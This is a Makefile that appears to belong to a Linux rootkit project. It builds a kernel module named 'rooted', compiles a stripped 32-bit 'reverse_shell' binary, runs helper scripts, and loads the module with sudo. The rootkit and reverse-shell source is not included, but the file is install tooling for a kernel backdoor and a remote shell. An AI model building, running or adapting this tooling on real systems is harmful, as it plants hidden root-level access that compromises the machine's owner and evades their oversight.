# If KERNELRELEASE is defined, we've been invoked from the
# kernel build system and can use its language.
ifneq ($(KERNELRELEASE),)
        obj-m := rooted.o

# Otherwise we were called directly from the command
# line; invoke the kernel build system.
else
        KERNELDIR ?= /lib/modules/$(shell uname -r)/build
        PWD := $(shell pwd)
default:
	sh link_reverse.sh
	gcc -Wall -m32 -s -o reverse_shell reverse_shell.c -L /usr/lib/parallels-tools/installer/iagent32/libgcc_s.so.1/libgcc_s.so.1
	make -C $(KERNELDIR) M=$(PWD) modules
	sudo sh load_module.sh
clean:
	rm -rf *.o *.mod.c *.symvers *.mod *.order *.ko.unsigned *.ko rooted.c reverse_shell

endif
